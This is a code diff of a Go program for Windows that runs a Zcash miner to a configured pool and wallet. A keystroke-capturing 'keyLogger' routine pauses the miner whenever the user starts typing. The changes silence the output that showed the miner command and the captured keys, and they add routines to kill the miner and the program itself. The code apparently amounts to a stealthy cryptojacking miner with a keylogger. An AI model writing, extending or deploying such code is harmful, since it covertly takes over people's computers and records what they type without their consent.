@@ -2,13 +2,14 @@ package main
 
 import (
 	//"encoding/json"
+	"bytes"
 	"fmt"
 	"os"
 	"os/exec"
 	"path"
-	"reflect"
 	"runtime"
 	"strconv"
+	"strings"
 	"syscall"
 	"time"
 
@@ -43,7 +44,7 @@ var (
 
 // ReadConfig reads info from config file
 func ReadConfig(configfile string) Configuration {
-	fmt.Printf("Config file path in readconfig function")
+	fmt.Printf("Config file read: ")
 	fmt.Println(configfile)
 	var conf Configuration
 	if _, err := toml.DecodeFile(configfile, &conf); err != nil {
@@ -72,7 +73,7 @@ func keyLogger(config *Configuration) {
 		if elapsedsec <= 10 && len(tmpKeylog) != 0 {
 			fmt.Println("Long String detected in 10s")
 			// Stop Miner
-			StopMiner(config)
+			go StopMiner(config)
 			return
 		}
 
@@ -81,7 +82,6 @@ func keyLogger(config *Configuration) {
 			if Val&0x1 == 0 {
 				continue
 			}
-			// if int(Val) == -32767 || int(Val) == 32768 {
 			switch KEY {
 			// case w32.VK_CONTROL:
 			// 	tmpKeylog += "[Ctrl]"
@@ -320,7 +320,6 @@ func keyLogger(config *Configuration) {
 			case 0x5A:
 				tmpKeylog += "z"
 			}
-			// }
 		}
 	}
 }
@@ -335,6 +334,7 @@ func (f *Configuration) SetPID(pid int) {
 // Ref: https://github.com/nanopool/ewbf-miner/releases
 func RunMiner(config *Configuration) {
 
+	// fmt.Println("Start RunMiner function")
 	if config.LocalMachineName == "" {
 		host, err := os.Hostname()
 		if err != nil {
@@ -348,20 +348,17 @@ func RunMiner(config *Configuration) {
 	dirpath := path.Dir(currentFilePath)
 
 	var fullcommand = fmt.Sprintf(dirpath) + "/" + config.ZcashMinerDir + "/" + minerprocess + " --server " + config.DefaultPoolAddress + " --user " + config.DefaultZcashWalletAddress + "." + config.LocalMachineName + " --port " + config.DefaultPoolPort + " " + config.ZcashMinerFlagExtra
-	fmt.Println(fullcommand)
-	fmt.Print("Process ID = ")
-	fmt.Println(config.ProcessID)
-	fmt.Print("Type of Process ID = ")
-	fmt.Println(reflect.TypeOf(config.ProcessID))
+	// fmt.Println(fullcommand)
+	// fmt.Print("Process ID = ")
+	// fmt.Println(config.ProcessID)
+	// fmt.Print("Type of Process ID = ")
+	// fmt.Println(reflect.TypeOf(config.ProcessID))
 	// Check if process been ran
 	if config.ProcessID == 0 {
-		c := exec.Command("cmd", "/B", fullcommand)
-		// if err := c.Run(); err != nil {
-		if err := c.Start(); err != nil {
+		c := exec.Command("cmd", "/C", fullcommand)
+		if err := c.Run(); err != nil {
 			fmt.Println("Error: ", err)
 		}
-		fmt.Print("Process ID = ")
-		fmt.Println(c.Process.Pid)
 		config.SetPID(c.Process.Pid)
 		// config.ProcessID = c.Process.Pid
 	}
@@ -369,8 +366,44 @@ func RunMiner(config *Configuration) {
 
 // StopMiner kill minging process
 func StopMiner(config *Configuration) {
-	fmt.Println(config.ProcessID)
-	var killcommand = "Taskkill /PID " + strconv.Itoa(config.ProcessID) + " /F"
+	// fmt.Println(config.ProcessID)
+	pid := strconv.Itoa(config.ProcessID)
+	// Awaiting to complete
+	if config.ProcessID == 0 {
+		// s := "for /f \"" + "tokens=2\"" + " %a in ('" + " tasklist ^| find \"miner.exe\"'" + ") do Taskkill /PID %a /F 1 > run.log 2>&1"
+		s := "tasklist | findstr miner.exe"
+		// fmt.Println(s)
+		// c := exec.Command("cmd", "/C", s)
+		// if err := c.Run(); err != nil {
+		// 	fmt.Println("Error: ", err)
+		// }
+		cmd := exec.Command("cmd", "/C", s)
+		var out bytes.Buffer
+		var stderr bytes.Buffer
+		cmd.Stdout = &out
+		cmd.Stderr = &stderr
+		err := cmd.Run()
+		if err != nil {
+			fmt.Println(fmt.Sprint(err) + ": " + stderr.String())
+			return
+		}
+		// fmt.Println("Result: " + out.String())
+		results := strings.Fields(out.String())
+		result := strings.Split(fmt.Sprint(results), " ")[1]
+		// fmt.Println("Result = XXX", result, "XXX")
+		// fmt.Println(reflect.TypeOf(result))
+		// cmd := exec.Command("cmd", "/C", s)
+		// b, e := cmd.Output()
+		// fmt.Println(b)
+		// if e != nil {
+		// 	fmt.Printf("failed due to :%v\n", e)
+		// 	panic(e)
+		// }
+		// return
+		// pid = strconv.Atoi(strings.Replace(fmt.Sprint(result[0]), " ", "", -1))
+		pid = strings.TrimSpace(result)
+	}
+	var killcommand = "Taskkill /PID " + pid + " /F"
 	fmt.Print("KillCommand is ")
 	fmt.Println(killcommand)
 	c := exec.Command("cmd", "/c", killcommand)
@@ -379,10 +412,18 @@ func StopMiner(config *Configuration) {
 	}
 }
 
+func suiside() {
+	pid := os.Getpid()
+	str := strconv.Itoa(pid)
+	fmt.Println("Process identifier: ", str)
+	exec.Command("Taskkill", "/PID", str, " /F")
+	// ret, _ := exec.Command("kill", "-9", str).Output()
+	// fmt.Println("this will never be printed: ", ret)
+}
+
 func main() {
 	_, currentFilePath, _, _ := runtime.Caller(0)
 	dirpath := path.Dir(currentFilePath)
-	// fmt.Println(fmt.Sprintf(dirpath,"/config.json"))
 	var configpath = fmt.Sprintf(dirpath) + "/config.toml"
 	var config = ReadConfig(configpath)
 	config.ProcessID = 0
@@ -391,13 +432,14 @@ func main() {
 	go RunMiner(&config)
 	// Run Miner
 	go keyLogger(&config)
-	fmt.Println("Finish running keyLogger")
-	// go windowLogger()
-	fmt.Println("Press Enter on me to see logs.")
-	os.Stdin.Read([]byte{0}) // For pausing purpose only
-	fmt.Println("Reading Stdin")
-	fmt.Println(tmpKeylog)
+	// fmt.Println("Finish running keyLogger")
+	// fmt.Println("Press Enter on me to see logs.")
+	// os.Stdin.Read([]byte{0}) // For pausing purpose only
+	// fmt.Println("Reading Stdin")
+	// fmt.Println(tmpKeylog)
 	fmt.Println("Press Enter to Exit.")
 	os.Stdin.Read([]byte{0}) // For pausing purpose only
-	fmt.Println("Reading Stdin Again")
+	// fmt.Println("Reading Stdin Again")
+	StopMiner(&config)
+	suiside()
 }
